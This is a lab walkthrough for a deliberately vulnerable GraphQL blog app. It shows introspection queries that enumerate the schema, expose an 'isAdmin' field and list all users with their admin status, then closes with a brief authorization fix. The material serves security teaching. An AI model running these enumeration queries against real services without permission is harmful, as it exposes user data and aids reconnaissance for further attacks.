# GraphQL Introspection

The application uses GraphQL to retrieve Users and Posts for the defdev.eu new blog. 

> Run the application 

```sh
docker build . -t graphql/intro && docker run -ti -p 5000:5000 graphql/intro
```

Great now the app is running. Browse to `http://0.0.0.0:5000/` 

## Discovery 

As soon as we browse on `http://0.0.0.0:5000` we see the few posts published by 2 users

<SCREENSHOT>


## Exploitation 

We want to use the introspection feature (enabled) in this case, to understand more about what queries are supported. 


Let' use the `GraphiQL` UI to send queries to the backend and discover what is available. 

Go to `http://0.0.0.0:5000/graphql`. We can query the generic `__schema` using:

```
{
  __schema {
    types {
      name
    }
  }
}
```

The application gives us interesting `Types`. Let's explore the `UserObject` one. If we build a more complex query we can ask for more information, exploring every field available. Let's send the following:

```
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
        ofType {
          name
          kind
        }
      }
    }
  }
}
```
In this case, for each field we we want to know what are the subfields and of which type.

The application will answer with:

```
{
  "data": {
    "__type": {
      "name": "UserObject",
      "fields": [
        {
          "name": "uuid",
          "type": {
            "name": null,
            "kind": "NON_NULL",
            "ofType": {
              "name": "ID",
              "kind": "SCALAR"
            }
          }
        },
        {
          "name": "username",
          "type": {
            "name": "String",
            "kind": "SCALAR",
            "ofType": null
          }
        },
        {
          "name": "isAdmin",
          "type": {
            "name": "Boolean",
            "kind": "SCALAR",
            "ofType": null
          }
        },
        {
          "name": "posts",
          "type": {
            "name": "PostObjectConnection",
            "kind": "OBJECT",
            "ofType": null
          }
        },
        {
          "name": "id",
          "type": {
            "name": null,
            "kind": "NON_NULL",
            "ofType": {
              "name": "ID",
              "kind": "SCALAR"
            }
          }
        }
      ]
    }
  }
}
```
> BINGO! We have some good information here

We can see that there is an interesting field `isAdmin`, that we can use to find out who is the admin of the application. 
 

Now we just need to query all the Users. To do that, let's see if there is a query available. We can use the following syntax:

```
query availableQueries {
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

That will give us the `allUsers` query. Now we need to understand what are the fields. We can do that in different ways, using GraphiQL or doing some more introspection. In this case we use GraphiQL, sending the following query:

```
{
  allUsers {
    edges {
      node {
        username
        isAdmin
      }
    }
  }
}

```

## Fix

Implement authorization on graphql endpoint. Although authenticated users could query the information, you should not map sensitive information into the type defined into the schema.


